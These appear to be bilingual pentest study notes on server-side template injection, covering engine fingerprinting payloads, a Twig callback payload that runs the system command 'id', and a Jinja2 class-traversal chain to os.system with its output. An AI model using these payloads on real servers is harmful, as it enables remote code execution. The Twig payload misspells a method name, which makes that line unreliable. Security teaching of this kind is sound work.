# SSTI (Server-Side Template Injection)

Server-side template injection (SSTI) happens when an attacker can insert malicious code using the template engine’s native syntax, which then gets executed on the server.

Template engines are meant to create web pages by merging static templates with dynamic data. SSTI occurs when user input is directly embedded into a template instead of being treated as data. This gives attackers the ability to inject arbitrary template commands, potentially letting them manipulate the engine and even gain full control of the server. Unlike client-side template injection, SSTI executes on the server, making it significantly more dangerous.

By default, many template engines enable auto-escaping or HTML-escaping prior to rendering. This can make exploitation more challenging, due to the strict quote filtering applied when rendering string-based data. Without string-based data in some form, RCE is significantly harder to achieve on certain template engines,  being a notable example.

## Identify

Once you have detected the template injection potential, the next step is to identify the template engine. Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used.

A common way of doing this is to inject arbitrary mathematical operations using syntax from different template engines. You can then observe whether they are successfully evaluated. To help with this process, you can use a decision tree similar to the following:

<figure><img src="../.gitbook/assets/ssti-1.png" alt=""><figcaption></figcaption></figure>

You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload `{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2. Therefore, it is important not to jump to conclusions based on a single successful response.

## Filters

Dentro do templates, há filtros que servem para executar determinada funções. Por exemplo `{{"test"|upper}}` irá colocar a string `test` em maiúsculo. Podemos dar uma olhada na documentação do [Twig](https://twig.symfony.com/doc/3.x/) e ver que existem várias funções e filtros.

## Twig Template

E se pudessemos criar nossa própria função e adicionar ele dentro do Twig? É possível registrar uma função de callback a partir do sistema de template do Twig. Vamos ver como conseguimos fazer isso.

Antes precisamos saber que o Twig tem as variáveis e funções globais que ficam num local chamado `env` . Com isso, precisamos fazer que a variável que estamos utilizando seja retorando para o `env` usando o self.

Vamos supor que a seguinte URL esteja retornando o que é esperado retornar comprovado que é vulnerável a SSTI.

```
http://10.10.0.7/?email={{7*7}}
```

Agora podemos registrar uma função `system` do php e em seguida chamar ela passando como parâmetro o comado do sistema operacional `id`.

{% code overflow="wrap" fullWidth="false" %}
```
http://10.10.0.7/?email={{_self.env.registerUndefinedFucntionCallback('system')}}{{_self.env.getFunction('id')}}
```
{% endcode %}

## Jinja2 Template

```
>>> string = "1337"

>>> string.__class__.mro()
[<class 'str'>, <class 'object'>]

>>> string.__class__.mro()[1]
<class 'object'>

>> string.__class__.mro()[1].__subclasses__()
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>...
```

img jinja2

```
>>> string.__class__.mro()[1].__subclasses__()[155]
<class 'os._wrap_close'>

>> string.__class__.mro()[1].__subclasses__()[155].__init__.__globals__
{'__name__': 'os', '__doc__': "OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n  - all functions ...

>>> string.__class__.mro()[1].__subclasses__()[155].__init__.__globals__['system']('id')
uid=1000(nizyuu) gid=1000(nizyuu) groups=1000(nizyuu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
0
```

https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti

https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
